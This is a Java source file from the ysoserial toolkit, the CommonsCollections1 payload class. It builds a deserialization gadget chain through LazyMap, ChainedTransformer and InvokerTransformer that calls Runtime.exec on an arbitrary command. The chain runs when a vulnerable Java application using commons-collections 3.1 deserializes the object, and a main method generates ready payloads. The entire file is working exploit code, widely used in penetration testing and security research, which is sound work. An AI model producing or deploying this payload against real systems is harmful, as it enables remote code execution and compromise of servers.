package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	public InvocationHandler getObject(final String command) throws Exception {
		Transformer transformerChain = null;
		Transformer[] transformers = null;

		if (command.startsWith("#")) {
			String tcommand = command.substring(1, command.length());
			final String[] execArgs = tcommand.split("\\|\\|");
			// inert chain for setup
			transformerChain = new ChainedTransformer(
					new Transformer[]{ new ConstantTransformer(1) });
			// real chain for after setup
			transformers = new Transformer[] {
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[] {
							String.class, Class[].class }, new Object[] {
							"getRuntime", new Class[0] }),
					new InvokerTransformer("invoke", new Class[] {
							Object.class, Object[].class }, new Object[] {
							null, new Object[0] }),
					new InvokerTransformer("exec",
							new Class[] { String[].class }, new Object[] { execArgs } ),
					new ConstantTransformer(1) };
		} else {
			final String[] execArgs = new String[] { command };
			// inert chain for setup
			transformerChain = new ChainedTransformer(
					new Transformer[]{new ConstantTransformer(1)});
			// real chain for after setup
			transformers = new Transformer[]{
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[]{
							String.class, Class[].class}, new Object[]{
							"getRuntime", new Class[0]}),
					new InvokerTransformer("invoke", new Class[]{
							Object.class, Object[].class}, new Object[]{
							null, new Object[0]}),
					new InvokerTransformer("exec",
							new Class[]{String.class}, execArgs ),
					new ConstantTransformer(1)};
		}

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1.class, args);
	}
	
	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
